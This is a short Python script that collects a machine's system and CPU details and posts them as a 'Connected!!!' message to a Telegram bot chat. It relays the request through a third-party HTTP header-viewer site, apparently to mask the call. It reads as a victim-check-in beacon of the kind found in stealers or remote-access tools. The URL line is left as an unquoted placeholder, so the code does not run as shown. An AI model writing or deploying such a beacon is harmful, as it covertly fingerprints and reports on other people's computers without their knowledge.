import requests
import platform
import cpuinfo as cpu

system = platform.uname()[0]
node = platform.uname()[1]
release = platform.uname()[2]
version = platform.uname()[3]
machine = platform.uname()[4]
brand = cpu.get_cpu_info()['brand_raw']
bits = cpu.get_cpu_info()['bits']


# Enter your api telegram bot and chat id in url variable
url = #api telegram bot chat_id=    &text=Connected!!!\n"+str(f'system = {system}\nnode = {node}\nrelease = {release}\nversion = {version}\nmachine = {machine}\ncpu brand = {brand}\ncpu bits = {bits}')

dict_info = {"UrlBox":url,
    'AgentList': 'Mozilla Firefox',
    'VersionsList':'HTTP/1.1',
    'MethodList':'GET'
}

http = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=dict_info)

print(http)



